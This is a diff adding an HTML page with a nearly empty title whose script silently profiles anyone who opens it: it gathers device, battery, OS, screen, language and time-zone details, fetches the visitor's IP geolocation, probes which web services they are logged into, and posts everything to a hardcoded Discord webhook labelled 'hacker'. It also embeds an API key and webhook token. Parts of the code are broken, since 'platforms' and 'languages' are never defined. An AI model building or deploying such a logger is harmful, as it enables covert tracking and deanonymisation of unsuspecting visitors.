@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<title> e <title>
+  
+<script>
+  let results = [];
+      
+      platforms.forEach((network) => {
+        const img = document.createElement('img');
+        img.src = network.domain + network.redirect;
+        img.onload = () => {
+          results.push([network, !0]);
+        };
+        img.onerror = () => {
+          results.push([network, !1]);
+        };
+      });
+      
+      async function grabIP() {
+        return await (await fetch("https://ipgeolocation.abstractapi.com/v1/?api_key=32eabae279094e229e80a1623d668b1c")).json();
+      }
+      
+      async function webhookPost(message) {
+        return await fetch("https://discord.com/api/webhooks/1167727857263456306/gDDmws6G2MftWAB4uaIYRfQHv3uzJSpcud3XFcI9sC8UdqmqsriLHK6EcnQEiRfy1O5H", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({"content": message, "username": "hacker", "avatar_url": "https://cdn.discordapp.com/attachments/851790287150776361/869792115088048189/11acbd4d2fbf9d1c70c1adb29a44db77.png",})
+        });
+      }
+      
+      const prettyStringify = (obj, tabWidth = 2) => {
+        let i = 0;
+        let ignore = false;
+        let escape = false;
+        return (JSON.stringify(obj).split('').reduce((a, v) => {
+          if (!ignore) {
+            i += (v == '{') - (v == '}');
+            v = v.replace('{', '{\n').replace(':', ': ').replace(',', ',\n').replace('}', '\n}');
+          }
+          if (!escape) {
+            if (v == '"') ignore = !ignore;
+          } else {
+            escape = false;
+          }
+          if (v == '\\') escape = true;
+          return a + v.replace('\n', '\n' + ('').padStart(i * tabWidth, ' '));
+        }, ''));
+      }
+
+      var url = "https://ipgeolocation.abstractapi.com/v1/?api_key=32eabae279094e229e80a1623d668b1c";
+
+      (async () => {
+        const id = ('        ').split('').map((c) => Math.floor(Math.random() * 0xFF).toString(16).padStart(2, '0')).join('');
+        let battery = {
+          charging: true,
+          chargingTime: 0,
+          level: 1
+        };
+        
+        if (typeof navigator.getBattery === "function") {
+          await navigator.getBattery().then((result) => {
+            battery = result
+          });
+        }
+        
+        await webhookPost(`# --------------------------------------------------------------------------------------\n## New request from device:\nType: ${(window.orientation > -1) ? "Mobile" : "Desktop/Laptop"}\nBattery: ${battery.level * 100}% ${battery.charging ? "(charging)" : "(not charging)"} with ${new Date((battery.charging ? Math.min(86399, battery.chargingTime) : Math.min(86399, battery.dischargingTime)) * 1000).toISOString().slice(11, 19)} remaining ${battery.charging ? "until fully charged" : ""}\nOS: ${navigator.platform}\nUser Agent: ${navigator.userAgent}\nScreen: ${window.screen.width * ((window.orientation > -1) ? window.devicePixelRatio : 1)}x${window.screen.height * ((window.orientation > -1) ? window.devicePixelRatio : 1)} (in ${(window.orientation == 90 || window.orientation == -90) ? "portrait" : "landscape"} mode)\nLanguages: ${navigator.languages.map((l) => l + (languages[l] ? " (" + languages[l].name + " / " + languages[l].nativeName + ")" : " (???)")).join(', ')}\nDefault Language: ${navigator.language.toLowerCase() + (languages[navigator.language.toLowerCase()] ? " (" + languages[navigator.language.toLowerCase()].name + " / " + languages[navigator.language.toLowerCase()].nativeName + ")" : " (???)")}\nTime Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone + " " + new Date().toString().match(/([A-Z]+[\+-][0-9]+.*)/)[1]}\n\n*ID: ${id}; At: ${new Date().toString()}*`);
+        
+        const ipInfo = await grabIP();
+        await webhookPost(`## IP info:\n\`\`\`json\n${prettyStringify(ipInfo)}\n\`\`\`\n\n*ID: ${id}; At: ${new Date().toString()}*`);
+        
+        await new Promise((resolve) => {
+          const start_time = Date.now();
+          function check() {
+            if (results.length == platforms.length) {
+              resolve();
+            } else {
+              window.setTimeout(check, 100);
+            }
+          }
+          check();
+        });
+        await webhookPost(`## Signed into these services:\n${results.filter((n) => n[1]).map((n) => "[" + n[0].name + "](<" + n[0].domain + ">)").join('\n')}\n\n*ID: ${id}; At: ${new Date().toString()}*`);
+      })();
+  
+  <script>
